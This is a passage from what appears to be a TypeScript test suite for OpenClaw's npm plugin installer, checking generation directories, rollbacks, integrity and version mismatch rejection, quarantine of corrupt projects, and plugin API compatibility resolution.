    assert(first.ok, JSON.stringify(first));
    const firstEntry = path.join(first.targetDir, "dist", "index.js");
    expect(first.targetDir).toBe(resolveTestPluginPackageDir(npmRoot, packageName));
    const oldModule = await import(pathToFileURL(firstEntry).href);
    expect(oldModule.default.version).toBe("v1");

    mockNpmViewAndInstall({
      spec: `${packageName}@2.0.0`,
      version: "2.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
      indexJs: `module.exports = {
  version: "v2",
  runAttempt: async () => (await import("./run-attempt-new.js")).default,
};\n`,
      extraDistFiles: {
        "run-attempt-new.js": "module.exports = { chunk: 'new' };\n",
      },
      replaceExisting: true,
      expectedDependencySpec: "2.0.0",
    });

    const update = await installPluginFromNpmSpec({
      spec: `${packageName}@2.0.0`,
      mode: "update",
    });

    assert(update.ok, JSON.stringify(update));
    const updateGenerationRoot = resolvePluginNpmGenerationProjectDir({
      npmDir: npmRoot,
      packageName,
      generationKey: [
        packageName,
        "2.0.0",
        `${packageName}@2.0.0`,
        "sha512-codex-v2",
        "codexv2sha",
      ].join("\n"),
    });
    expect(update.targetDir).toBe(
      path.join(updateGenerationRoot, "node_modules", ...packageName.split("/")),
    );
    expect(update.targetDir).not.toBe(first.targetDir);
    expect(fs.existsSync(path.join(first.targetDir, "dist", "run-attempt-old.js"))).toBe(true);
    expect(fs.existsSync(path.join(update.targetDir, "dist", "run-attempt-new.js"))).toBe(true);

    await expect(oldModule.default.runAttempt()).resolves.toEqual({ chunk: "old" });
    const newModule = await import(
      pathToFileURL(path.join(update.targetDir, "dist", "index.js")).href
    );
    await expect(newModule.default.runAttempt()).resolves.toEqual({ chunk: "new" });
  });

  it("does not mutate a retained generation when an exact rollback reuses its artifact key", async () => {
    const packageName = "@openclaw/codex";
    const install = async (version: string, options: { mode?: "update" }) =>
      installPluginFromNpmSpec({
        spec: `${packageName}@${version}`,
        mode: options.mode,
      });

    mockNpmViewAndInstall({
      spec: `${packageName}@2.0.0`,
      version: "2.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
      indexJs: `module.exports = {
  version: "v2",
  runAttempt: async () => (await import("./run-attempt-v2.js")).default,
};\n`,
      extraDistFiles: {
        "run-attempt-v2.js": "module.exports = { chunk: 'v2' };\n",
      },
      expectedDependencySpec: "2.0.0",
    });
    const first = await install("2.0.0", {});
    assert(first.ok, JSON.stringify(first));
    const retainedModule = await import(
      pathToFileURL(path.join(first.targetDir, "dist", "index.js")).href
    );
    const retainedPackageDir = first.targetDir;

    mockNpmViewAndInstall({
      spec: `${packageName}@3.0.0`,
      version: "3.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v3",
      shasum: "codexv3sha",
      indexJs: "module.exports = { version: 'v3' };\n",
      replaceExisting: true,
      expectedDependencySpec: "3.0.0",
    });
    const update = await install("3.0.0", { mode: "update" });
    assert(update.ok, JSON.stringify(update));
    await markRetainedManagedNpmInstall({
      packageDir: retainedPackageDir,
      pluginId: "codex",
      reason: "test-rollback-retention",
    });

    mockNpmViewAndInstall({
      spec: `${packageName}@2.0.0`,
      version: "2.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
      indexJs: "module.exports = { version: 'v2-rollback' };\n",
      replaceExisting: true,
      expectedDependencySpec: "2.0.0",
    });
    const rollback = await install("2.0.0", { mode: "update" });
    assert(rollback.ok, JSON.stringify(rollback));
    expect(rollback.targetDir).not.toBe(retainedPackageDir);
    await expect(retainedModule.default.runAttempt()).resolves.toEqual({ chunk: "v2" });
    expect(fs.existsSync(path.join(retainedPackageDir, "dist", "run-attempt-v2.js"))).toBe(true);
  });

  it("installs into a fresh generation when the legacy npm target is retained", async () => {
    const packageName = "@openclaw/codex";
    const legacyPackageDir = resolveTestPluginPackageDir(npmRoot, packageName);
    fs.mkdirSync(legacyPackageDir, { recursive: true });
    await markRetainedManagedNpmInstall({
      packageDir: legacyPackageDir,
      pluginId: "codex",
      retainedAt: "2026-04-25T00:00:00.000Z",
      reason: "replaced-by-managed-npm-generation-update",
    });
    mockNpmViewAndInstall({
      spec: `${packageName}@2.0.0`,
      version: "2.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
      expectedDependencySpec: "2.0.0",
    });

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@2.0.0`,
    });

    assert(result.ok, JSON.stringify(result));
    expect(result.targetDir).toBe(
      resolveTestPluginGenerationPackageDir({
        npmRoot,
        packageName,
        version: "2.0.0",
        integrity: "sha512-codex-v2",
        shasum: "codexv2sha",
      }),
    );
    expect(result.targetDir).not.toBe(legacyPackageDir);
    expect(fs.existsSync(legacyPackageDir)).toBe(true);
  });

  it("allocates a fresh generation when a plain install selects a retained artifact", async () => {
    const packageName = "@openclaw/codex";
    const legacyPackageDir = resolveTestPluginPackageDir(npmRoot, packageName);
    const retainedGenerationPackageDir = resolveTestPluginGenerationPackageDir({
      npmRoot,
      packageName,
      version: "2.0.0",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
    });
    fs.mkdirSync(legacyPackageDir, { recursive: true });
    fs.mkdirSync(retainedGenerationPackageDir, { recursive: true });
    for (const packageDir of [legacyPackageDir, retainedGenerationPackageDir]) {
      await markRetainedManagedNpmInstall({
        packageDir,
        pluginId: "codex",
        retainedAt: "2026-04-25T00:00:00.000Z",
        reason: "test-retained-generation",
      });
    }
    mockNpmViewAndInstall({
      spec: `${packageName}@2.0.0`,
      version: "2.0.0",
      pluginId: "codex",
      integrity: "sha512-codex-v2",
      shasum: "codexv2sha",
      expectedDependencySpec: "2.0.0",
    });

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@2.0.0`,
    });

    assert(result.ok, JSON.stringify(result));
    expect(result.targetDir).not.toBe(retainedGenerationPackageDir);
    expect(hasRetainedManagedNpmInstallMarker(result.targetDir)).toBe(false);
    expect(hasRetainedManagedNpmInstallMarker(retainedGenerationPackageDir)).toBe(true);
    expect(hasRetainedManagedNpmInstallMarker(legacyPackageDir)).toBe(true);
  });

  const metadataFailures: Array<{
    label: string;
    fixture: Partial<MockNpmPackage>;
    errors: string[];
    attempts: number;
    expectedIntegrity?: string;
  }> = [
    {
      label: "integrity drift",
      fixture: { integrity: "sha512-safe", installedIntegrity: "sha512-evil" },
      errors: ["integrity sha512-evil", "expected sha512-safe"],
      attempts: 1,
      expectedIntegrity: "sha512-safe",
    },
    {
      label: "version drift",
      fixture: { installedVersion: "1.0.1" },
      errors: ["version 1.0.1", "expected 1.0.0"],
      attempts: 1,
    },
    {
      label: "missing integrity",
      fixture: { integrity: "sha512-safe", omitInstalledIntegrity: true },
      errors: [
        "metadata remained incomplete after managed npm project recovery",
        "integrity missing",
      ],
      attempts: 2,
      expectedIntegrity: "sha512-safe",
    },
    {
      label: "missing version",
      fixture: { integrity: "sha512-safe", omitInstalledVersion: true },
      errors: [
        "metadata remained incomplete after managed npm project recovery",
        "version missing",
      ],
      attempts: 2,
      expectedIntegrity: "sha512-safe",
    },
    {
      label: "missing lock entry",
      fixture: { skipLockfileEntry: true },
      errors: ["npm install did not record package-lock metadata for metadata-plugin"],
      attempts: 2,
    },
  ];
  it.each(metadataFailures)(
    "rejects $label without publishing the plugin",
    async ({ fixture, errors, attempts, expectedIntegrity }) => {
      const packageName = "metadata-plugin";
      const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
      mockNpmViewAndInstall({
        spec: `${packageName}@latest`,
        expectedDependencySpec: "1.0.0",
        ...fixture,
      });
      const result = await installPluginFromNpmSpec({
        spec: `${packageName}@latest`,
        expectedIntegrity,
      });
      assert(!result.ok, JSON.stringify(result));
      for (const error of errors) {
        expect(result.error).toContain(error);
      }
      expect(
        runCommandWithTimeoutMock.mock.calls.filter(([argv]) => isManagedNpmInstallCommand(argv)),
      ).toHaveLength(attempts);
      if (attempts === 2) {
        expectManagedNpmQuarantine([result.error]);
      } else {
        expect(
          fs.existsSync(
            path.join(path.dirname(npmProjectRoot), "_openclaw-quarantined-npm-projects"),
          ),
        ).toBe(false);
      }
      expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
    },
  );

  it("rejects a trusted pin when registry metadata omits integrity before install", async () => {
    const packageName = "missing-registry-integrity-plugin";
    mockNpmViewAndInstall({
      spec: `${packageName}@latest`,
      integrity: "sha512-substituted",
      shasum: "substituted-shasum",
      omitViewIntegrity: true,
      expectedDependencySpec: "1.0.0",
    });

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@latest`,
      expectedIntegrity: "sha512-trusted",
    });

    expect(result).toEqual({
      ok: false,
      error: `aborted: npm package integrity missing for ${packageName}@1.0.0`,
    });
    expect(
      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
    ).toBe(false);
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
  });

  it("quarantines incomplete integrity metadata and rebuilds the managed project once", async () => {
    const packageName = "missing-integrity-plugin";
    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
    const fixture: MockNpmPackage & { spec: string } = {
      spec: `${packageName}@latest`,
      packageName,
      version: "1.0.0",
      pluginId: packageName,
      integrity: "sha512-safe",
      omitInstalledIntegrity: true,
      npmRoot,
      expectedDependencySpec: "1.0.0",
    };
    mockNpmViewAndInstall(fixture);
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    const warnings: string[] = [];
    let managedInstallAttempts = 0;
    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
      if (
        isManagedNpmInstallCommand(argv) &&
        typeof options?.cwd === "string" &&
        managedNpmRootHasDependency(options.cwd, packageName)
      ) {
        managedInstallAttempts += 1;
        if (managedInstallAttempts === 2) {
          fixture.omitInstalledIntegrity = false;
        }
      }
      return await delegate(argv, options);
    });

    const result = await installPluginFromNpmSpec({
      spec: fixture.spec,
      expectedIntegrity: fixture.integrity,
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    expect(result.ok).toBe(true);
    expect(managedInstallAttempts).toBe(2);
    expect(warnings.some((warning) => warning.includes("integrity missing"))).toBe(true);
    const installed = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package-lock.json"), "utf8"),
    ) as { packages?: Record<string, { integrity?: string }> };
    expect(installed.packages?.[`node_modules/${packageName}`]?.integrity).toBe("sha512-safe");
    expectManagedNpmQuarantine(warnings);
  });

  it("preserves the original project and staged quarantine when post-recovery validation fails", async () => {
    const packageName = "unsafe-recovered-plugin";
    const addedPeerName = "recovery-added-peer";
    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
    fs.mkdirSync(npmProjectRoot, { recursive: true });
    fs.writeFileSync(path.join(npmProjectRoot, "package.json"), '{"private":true}\n');
    fs.writeFileSync(path.join(npmProjectRoot, "original.txt"), "original bytes", "utf8");
    const originalProject = readTextFileTree(npmProjectRoot);
    const fixture: MockNpmPackage & { spec: string } = {
      spec: `${packageName}@latest`,
      packageName,
      version: "1.0.0",
      pluginId: packageName,
      integrity: "sha512-safe",
      omitInstalledIntegrity: true,
      npmRoot,
      expectedDependencySpec: "1.0.0",
    };
    mockNpmViewAndInstallMany([
      fixture,
      {
        packageName: addedPeerName,
        version: "2.0.0",
        npmRoot,
      },
    ]);
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    let managedInstallAttempts = 0;
    let attemptedRoot = "";
    const warnings: string[] = [];
    const outsideDependencyDir = suiteTempRootTracker.makeTempDir();
    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
      if (
        isManagedNpmInstallCommand(argv) &&
        typeof options?.cwd === "string" &&
        managedNpmRootHasDependency(options.cwd, packageName)
      ) {
        attemptedRoot = options.cwd;
        managedInstallAttempts += 1;
        if (managedInstallAttempts === 1) {
          const corruptPackage = path.join(attemptedRoot, "node_modules", "stale-plugin");
          fs.mkdirSync(corruptPackage, { recursive: true });
          fs.writeFileSync(path.join(corruptPackage, "stale.txt"), "poisoned stage", "utf8");
        }
        if (managedInstallAttempts === 2) {
          fixture.omitInstalledIntegrity = false;
        }
      }
      const commandResult = await delegate(argv, options);
      if (
        managedInstallAttempts === 2 &&
        isManagedNpmInstallCommand(argv) &&
        typeof options?.cwd === "string"
      ) {
        fs.symlinkSync(
          outsideDependencyDir,
          path.join(options.cwd, "node_modules", "outside-dependency"),
          "junction",
        );
      }
      return commandResult;
    });
    let mutatedPeerAfterQuarantine = false;
    const addPeerAfterQuarantine = () => {
      const manifestPath = path.join(attemptedRoot, "package.json");
      const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8")) as {
        dependencies?: Record<string, string>;
        openclaw?: { managedPeerDependencies?: string[] };
      };
      manifest.dependencies ??= {};
      manifest.dependencies[addedPeerName] = "2.0.0";
      manifest.openclaw ??= {};
      manifest.openclaw.managedPeerDependencies = [addedPeerName];
      writeJson(manifestPath, manifest);
      mutatedPeerAfterQuarantine = true;
    };

    const result = await installPluginFromNpmSpec({
      spec: fixture.spec,
      expectedIntegrity: fixture.integrity,
      logger: {
        info: () => {},
        warn: (message) => {
          warnings.push(message);
          if (message.includes("quarantined")) {
            addPeerAfterQuarantine();
          }
        },
      },
    });

    assert(!result.ok, JSON.stringify(result));
    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
    expect(result.error).toContain("installed dependency scan found package outside install root");
    expect(managedInstallAttempts).toBe(2);
    expect(mutatedPeerAfterQuarantine).toBe(true);
    const quarantineDir = expectManagedNpmQuarantine(warnings);
    expect(
      fs.readFileSync(
        path.join(quarantineDir, "node_modules", "stale-plugin", "stale.txt"),
        "utf8",
      ),
    ).toBe("poisoned stage");
    expect(readTextFileTree(npmProjectRoot)).toEqual(originalProject);
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
  });

  it("repairs a missing current-platform executable with a fresh npm cache", async () => {
    const packageName = "@openclaw/codex-fixture";
    const platformPackage = "@vendor/codex-platform";
    const canonicalPackage = "@vendor/codex";
    const platformPackageLocation = path.posix.join(
      "node_modules",
      packageName,
      "node_modules",
      platformPackage,
    );
    const warnings: string[] = [];
    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
      pluginId: "codex-fixture",
      expectedDependencySpec: "1.0.0",
      openclaw: {
        extensions: ["./dist/index.js"],
        install: { requiredPlatformPackages: [platformPackage] },
      },
    });
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    let managedInstallAttempts = 0;
    let repairCacheDir = "";
    let removedIncompletePackageBeforeRepair = false;
    runCommandWithTimeoutMock.mockImplementation(
      async (argv: string[], options?: { cwd?: string; env?: NodeJS.ProcessEnv }) => {
        const attemptRoot = options?.cwd;
        const installEnv = options?.env;
        const isTargetInstall = isManagedNpmInstallCommand(argv) && typeof attemptRoot === "string";
        const packageDir = path.join(attemptRoot ?? "", ...platformPackageLocation.split("/"));
        if (isTargetInstall && managedInstallAttempts === 1) {
          removedIncompletePackageBeforeRepair = !fs.existsSync(packageDir);
        }
        const result = await delegate(argv, options);
        if (isTargetInstall) {
          managedInstallAttempts += 1;
          writeMissingCurrentPlatformOptionalPackage({
            npmRoot: attemptRoot,
            packageName: platformPackage,
            packageLocation: platformPackageLocation,
          });
          const lockPath = path.join(attemptRoot, "package-lock.json");
          const lockfile = JSON.parse(fs.readFileSync(lockPath, "utf8")) as {
            packages: Record<string, unknown>;
          };
          lockfile.packages[`node_modules/${canonicalPackage}`] = {
            bin: { codex: "bin/codex.js" },
          };
          writeJson(lockPath, lockfile);
          if (managedInstallAttempts === 1) {
            fs.mkdirSync(packageDir, { recursive: true });

            writeJson(path.join(packageDir, "package.json"), {
              name: canonicalPackage,
              version: "1.0.0-platform",
              files: ["vendor"],
            });
            const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
            fs.mkdirSync(nativeBinDir, { recursive: true });
            fs.writeFileSync(path.join(nativeBinDir, "codex-helper"), "helper", "utf8");
          } else {
            repairCacheDir = installEnv?.npm_config_cache ?? "";
            fs.mkdirSync(packageDir, { recursive: true });
            writeJson(path.join(packageDir, "package.json"), {
              name: canonicalPackage,
              version: "1.0.0-platform",
              files: ["vendor"],
            });
            const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
            fs.mkdirSync(nativeBinDir, { recursive: true });
            const executableName = process.platform === "win32" ? "codex.exe" : "codex";
            fs.writeFileSync(path.join(nativeBinDir, executableName), "native executable", {
              encoding: "utf8",
              mode: 0o755,
            });
          }
        }
        return result;
      },
    );

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@1.0.0`,
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    expect(result.ok).toBe(true);
    expect(managedInstallAttempts).toBe(2);
    expect(removedIncompletePackageBeforeRepair).toBe(true);
    expect(repairCacheDir).toContain("openclaw-npm-cache-");
    expect(fs.existsSync(repairCacheDir)).toBe(false);
    expect(warnings).toContain(
      `npm left current-platform package(s) ${platformPackage} missing or incomplete; retrying once with a fresh cache.`,
    );
  });

  it("rejects installs that still omit current-platform packages after repair", async () => {
    const packageName = "@openclaw/codex-fixture";
    const platformPackage = "@vendor/codex-platform";
    const platformPackageLocation = path.posix.join(
      "node_modules",
      packageName,
      "node_modules",
      platformPackage,
    );
    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
      pluginId: "codex-fixture",
      expectedDependencySpec: "1.0.0",
      openclaw: {
        extensions: ["./dist/index.js"],
        install: { requiredPlatformPackages: [platformPackage] },
      },
    });
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    let managedInstallAttempts = 0;
    runCommandWithTimeoutMock.mockImplementation(
      async (argv: string[], options?: { cwd?: string }) => {
        const result = await delegate(argv, options);
        if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
          managedInstallAttempts += 1;
          writeMissingCurrentPlatformOptionalPackage({
            npmRoot: options.cwd,
            packageName: platformPackage,
            packageLocation: platformPackageLocation,
          });
        }
        return result;
      },
    );

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@1.0.0`,
    });

    assert(!result.ok, JSON.stringify(result));
    expect(managedInstallAttempts).toBe(2);
    expect(result.error).toContain(
      `npm install reported success but left required current-platform package(s) missing or incomplete: ${platformPackage}`,
    );
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
  });

  it("quarantines and rebuilds a corrupt managed npm project after npm from-argument failures", async () => {
    const packageName = "@openclaw/voice-call";
    const warnings: string[] = [];
    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
    fs.mkdirSync(npmProjectRoot, { recursive: true });
    fs.writeFileSync(path.join(npmProjectRoot, "original.txt"), "original bytes", "utf8");

    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
      pluginId: "voice-call",
      expectedDependencySpec: "1.0.0",
    });
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    let managedInstallAttempts = 0;
    runCommandWithTimeoutMock.mockImplementation(
      async (argv: string[], options?: { cwd?: string }) => {
        if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
          managedInstallAttempts += 1;
          if (managedInstallAttempts === 1) {
            const stalePackageDir = path.join(options.cwd, "node_modules", "stale-plugin");
            fs.mkdirSync(stalePackageDir, { recursive: true });
            fs.writeFileSync(path.join(stalePackageDir, "stale.txt"), "corrupt stage", "utf8");
            fs.writeFileSync(
              path.join(options.cwd, "package-lock.json"),
              '{"lockfileVersion":3,"packages":{"node_modules/stale-plugin":{}}}\n',
              "utf8",
            );
            fs.writeFileSync(path.join(options.cwd, "npm-shrinkwrap.json"), "{}\n", "utf8");
            expect(fs.readFileSync(path.join(npmProjectRoot, "original.txt"), "utf8")).toBe(
              "original bytes",
            );
            return failedSpawn(
              'npm ERR! code ERR_INVALID_ARG_TYPE\nnpm ERR! The "from" argument must be of type string. Received undefined',
            );
          }
        }
        return await delegate(argv, options);
      },
    );

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@1.0.0`,
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    assert(result.ok, JSON.stringify(result));
    expect(managedInstallAttempts).toBe(2);
    expect(result.pluginId).toBe("voice-call");
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
    expect(warnings.some((warning) => warning.includes("managed npm project corruption"))).toBe(
      true,
    );
    const quarantineDir = expectManagedNpmQuarantine(warnings);
    expect(
      fs.readFileSync(
        path.join(quarantineDir, "node_modules", "stale-plugin", "stale.txt"),
        "utf8",
      ),
    ).toBe("corrupt stage");
    expect(fs.readFileSync(path.join(quarantineDir, "package-lock.json"), "utf8")).toBe(
      '{"lockfileVersion":3,"packages":{"node_modules/stale-plugin":{}}}\n',
    );
    expect(fs.existsSync(path.join(quarantineDir, "npm-shrinkwrap.json"))).toBe(true);
    expect(fs.existsSync(path.join(npmProjectRoot, "node_modules", "stale-plugin"))).toBe(false);
  });

  it.each(npmCommandFailureCases.filter(({ label }) => label === "signal without output"))(
    "preserves $label when a managed install fails",
    async ({ npmResult, expectedDetail }) => {
      const packageName = "empty-output-plugin";

      mockNpmViewAndInstall({
        spec: `${packageName}@1.0.0`,
        expectedDependencySpec: "1.0.0",
      });
      const delegate = runCommandWithTimeoutMock.getMockImplementation();
      if (!delegate) {
        throw new Error("expected npm mock implementation");
      }
      runCommandWithTimeoutMock.mockImplementation(
        async (argv: string[], options?: { cwd?: string }) => {
          if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
            return npmResult;
          }
          return await delegate(argv, options);
        },
      );

      const result = await installPluginFromNpmSpec({
        spec: `${packageName}@1.0.0`,
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error).toBe(`npm install failed: ${expectedDetail}`);
      }
    },
  );

  it("keeps corrupt managed npm project artifacts quarantined when the rebuild retry fails", async () => {
    const packageName = "broken-plugin";
    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
    fs.mkdirSync(npmProjectRoot, { recursive: true });
    fs.writeFileSync(path.join(npmProjectRoot, "original.txt"), "original bytes", "utf8");
    const originalProject = readTextFileTree(npmProjectRoot);

    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
      expectedDependencySpec: "1.0.0",
    });
    const delegate = runCommandWithTimeoutMock.getMockImplementation();
    if (!delegate) {
      throw new Error("expected npm mock implementation");
    }
    let managedInstallAttempts = 0;
    runCommandWithTimeoutMock.mockImplementation(
      async (argv: string[], options?: { cwd?: string }) => {
        if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
          managedInstallAttempts += 1;
          if (managedInstallAttempts === 1) {
            const stalePackageDir = path.join(options.cwd, "node_modules", "stale-plugin");
            fs.mkdirSync(stalePackageDir, { recursive: true });
            fs.writeFileSync(path.join(stalePackageDir, "stale.txt"), "corrupt stage", "utf8");
            return failedSpawn(
              'npm ERR! code ERR_INVALID_ARG_TYPE\nnpm ERR! The "from" argument must be of type string. Received undefined',
            );
          }
          return failedSpawn("npm ERR! still broken");
        }
        return await delegate(argv, options);
      },
    );

    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@1.0.0`,
    });

    assert(!result.ok, JSON.stringify(result));
    expect(managedInstallAttempts).toBe(2);
    expect(result.error).toContain("npm install failed after managed npm project recovery");
    expect(result.error).toContain("Original npm error");
    const quarantineDir = expectManagedNpmQuarantine([result.error]);
    expect(
      fs.readFileSync(
        path.join(quarantineDir, "node_modules", "stale-plugin", "stale.txt"),
        "utf8",
      ),
    ).toBe("corrupt stage");
    expect(readTextFileTree(npmProjectRoot)).toEqual(originalProject);
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
  });

  it("rejects managed npm plugins when their openclaw peer link cannot be repaired", async () => {
    const warnings: string[] = [];

    resolveOpenClawPackageRootSyncMock.mockReturnValue(null);
    mockNpmViewAndInstall({
      spec: "@openclaw/codex@2026.5.7",
      version: "2026.5.7",
      peerDependencies: { openclaw: ">=2026.5.7" },
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/codex@2026.5.7",
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    assert(!result.ok, JSON.stringify(result));
    expect(result.error).toContain("@openclaw/codex");
    expect(result.error).toContain("plugin-local node_modules/openclaw link");
    expect(
      warnings.some((warning) => warning.includes("Could not locate openclaw package root")),
    ).toBe(true);
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, "@openclaw/codex"))).toBe(false);
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: "@openclaw/codex",
    });
    expect(fs.existsSync(path.join(npmProjectRoot, "package.json"))).toBe(false);
  });

  it("rejects exact npm plugins whose package compatibility requires a newer host", async () => {
    vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.10-beta.1");

    mockNpmViewAndInstall({
      spec: "@openclaw/whatsapp@2026.5.27",
      version: "2026.5.27",
      pluginId: "whatsapp",
      peerDependencies: { openclaw: ">=2026.5.27" },
      openclaw: {
        extensions: ["./dist/index.js"],
        install: { minHostVersion: ">=2026.4.25" },
        compat: { pluginApi: ">=2026.5.27" },
      },
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/whatsapp@2026.5.27",
    });

    assert(!result.ok, JSON.stringify(result));
    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_PLUGIN_API);
    expect(result.error).toContain("requires plugin API >=2026.5.27");
    expect(result.error).toContain("runtime exposes 2026.5.10-beta.1");
    expect(result.error).toContain("install a compatible plugin version");
    expect(fs.existsSync(path.join(npmRoot, "node_modules", "@openclaw", "whatsapp"))).toBe(false);
    expect(fs.existsSync(path.join(npmRoot, "package.json"))).toBe(false);
    expect(
      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
    ).toBe(false);
  });

  it("preserves an existing npm plugin by resolving update metadata to a compatible version", async () => {
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: "@openclaw/whatsapp",
    });
    const warnings: string[] = [];
    fs.mkdirSync(npmProjectRoot, { recursive: true });
    writeJson(path.join(npmProjectRoot, "package.json"), {
      private: true,
      dependencies: {
        "@openclaw/whatsapp": "2026.5.26",
      },
    });
    writeInstalledNpmPlugin({
      packageName: "@openclaw/whatsapp",
      version: "2026.5.26",
      pluginId: "whatsapp",
      npmRoot: npmProjectRoot,
      openclaw: {
        extensions: ["./dist/index.js"],
        install: { minHostVersion: ">=2026.4.25" },
        compat: { pluginApi: ">=2026.5.10-beta.1" },
      },
    });
    vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.10-beta.1");
    mockNpmViewAndInstallMany([
      {
        spec: "@openclaw/whatsapp",
        packageName: "@openclaw/whatsapp",
        version: "2026.5.27",
        pluginId: "whatsapp",
        npmRoot,
        versions: ["2026.5.26", "2026.5.27"],
        openclaw: {
          extensions: ["./dist/index.js"],
          install: { minHostVersion: ">=2026.4.25" },
          compat: { pluginApi: ">=2026.5.27" },
        },
      },
      {
        spec: "@openclaw/whatsapp@2026.5.26",
        packageName: "@openclaw/whatsapp",
        version: "2026.5.26",
        pluginId: "whatsapp",
        npmRoot,
        expectedDependencySpec: "2026.5.26",
        openclaw: {
          extensions: ["./dist/index.js"],
          install: { minHostVersion: ">=2026.4.25" },
          compat: { pluginApi: ">=2026.5.10-beta.1" },
        },
      },
    ]);

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/whatsapp",
      mode: "update",
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    assert(result.ok, JSON.stringify(result));
    expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/whatsapp@2026.5.26");
    expect(warnings.join("\n")).toContain("using newest compatible @openclaw/whatsapp@2026.5.26");
    expect(
      JSON.parse(
        fs.readFileSync(
          path.join(resolveTestPluginPackageDir(npmRoot, "@openclaw/whatsapp"), "package.json"),
          "utf8",
        ),
      ).version,
    ).toBe("2026.5.26");
    const managedManifest = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package.json"), "utf8"),
    ) as { dependencies?: Record<string, string> };
    expect(managedManifest.dependencies?.["@openclaw/whatsapp"]).toBe("2026.5.26");
    expect(
      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
    ).toBe(true);
  });

  it("resolves incompatible prerelease tags to a compatible prerelease version", async () => {
    const warnings: string[] = [];
    vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.28-beta.3");

    mockNpmViewAndInstallMany([
      {
        spec: "@openclaw/msteams@beta",
        packageName: "@openclaw/msteams",
        version: "2026.5.28-beta.4",
        pluginId: "msteams",
        npmRoot,
        versions: ["2026.5.28-beta.3", "2026.5.28-beta.4"],
        openclaw: {
          extensions: ["./dist/index.js"],
          compat: { pluginApi: ">=2026.5.28-beta.4" },
        },
      },
      {
        spec: "@openclaw/msteams@2026.5.28-beta.3",
        packageName: "@openclaw/msteams",
        version: "2026.5.28-beta.3",
        pluginId: "msteams",
        npmRoot,
        expectedDependencySpec: "2026.5.28-beta.3",
        openclaw: {
          extensions: ["./dist/index.js"],
